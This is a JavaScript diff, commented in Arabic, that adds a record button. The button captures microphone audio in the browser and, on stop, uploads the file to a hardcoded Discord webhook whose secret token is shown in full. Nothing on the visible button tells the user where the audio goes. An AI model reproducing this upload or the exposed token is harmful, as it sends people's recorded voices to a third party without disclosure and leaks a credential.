@@ -268,3 +268,37 @@ function stopRecording() {
 function refreshPage() {
     window.location.reload(); 
 }
+
+// --- تسجيل الصوت وإرساله إلى ديسكورد Webhook ---
+let mediaRecorder;
+let audioChunks = [];
+
+document.getElementById('recordButton').addEventListener('click', async () => {
+    if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(stream);
+
+        mediaRecorder.ondataavailable = event => {
+            audioChunks.push(event.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            const formData = new FormData();
+            formData.append('file', audioBlob, 'recording.webm');
+
+            await fetch('https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm', {
+                method: 'POST',
+                body: formData
+            });
+
+            audioChunks = []; // نفرغ الشchunks بعد الإرسال
+        };
+
+        mediaRecorder.start();
+        document.getElementById('recordButton').textContent = 'ايقاف التسجيل';
+    } else if (mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+        document.getElementById('recordButton').textContent = 'بدء تسجيل الصوت';
+    }
+});
